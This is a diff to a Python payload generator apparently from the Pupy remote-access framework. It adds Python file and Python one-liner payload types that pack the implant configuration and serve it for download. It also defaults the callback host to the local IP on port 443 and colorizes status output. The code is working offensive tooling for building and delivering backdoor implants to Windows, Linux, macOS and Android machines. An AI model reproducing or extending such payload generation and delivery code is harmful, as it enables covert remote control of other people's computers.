@@ -18,6 +18,8 @@ import shutil
 import subprocess
 import traceback
 from pupylib.utils.network import get_local_ip
+from pupylib.utils.term import colorize
+from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload
 from network.conf import transports, launchers
 from network.base_launcher import LauncherError
 
@@ -146,8 +148,8 @@ def get_edit_apk(path, new_path, conf):
 
 
 if __name__=="__main__":
-	parser = argparse.ArgumentParser(description='Generate EXE/DLL for windows and APK for android.')
-	parser.add_argument('-t', '--type', default='exe_x86', choices=['apk','exe_x86','exe_x64','dll_x86','dll_x64'], help="(default: exe_x86)")
+	parser = argparse.ArgumentParser(description='Generate payloads for windows, linux, osx and android.')
+	parser.add_argument('-t', '--type', default='exe_x86', choices=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner'], help="(default: exe_x86)")
 	parser.add_argument('-o', '--output', help="output path")
 	parser.add_argument('-s', '--offline-script', help="offline python script to execute before starting the connection")
 	parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
@@ -164,7 +166,7 @@ if __name__=="__main__":
 				myip=get_local_ip()
 				if not myip:
 					sys.exit("[-] --host parameter missing and couldn't find your local IP. You must precise an ip or a fqdn manually")
-				print("[!] required argument missing, automatically adding parameter --host %s:443 from local ip address"%myip)
+				print(colorize("[!] required argument missing, automatically adding parameter --host %s:443 from local ip address"%myip,"grey"))
 				args.launcher_args.insert(0,"%s:443"%myip)
 				args.launcher_args.insert(0,"--host")
 			else:
@@ -212,9 +214,18 @@ if __name__=="__main__":
 		if not outpath:
 			outpath="pupy.apk"
 		get_edit_apk(os.path.join("payload_templates","pupy.apk"), outpath, conf)
+	elif args.type=="py":
+		if not outpath:
+			outpath="pupy_packed.py"
+		packed_payload=pack_py_payload(get_raw_conf(conf))
+		with open(outpath, 'wb') as w:
+			w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+packed_payload)
+	elif args.type=="py_oneliner":
+		packed_payload=pack_py_payload(get_raw_conf(conf))
+		serve_payload(packed_payload)
 	else:
 		exit("Type %s is invalid."%(args.type))
-	print("binary generated with config :")
+	print(colorize("[+] ","green")+"payload successfully generated with config :")
 	print("OUTPUT_PATH = %s"%os.path.abspath(outpath))
 	print("LAUNCHER = %s"%repr(args.launcher))
 	print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
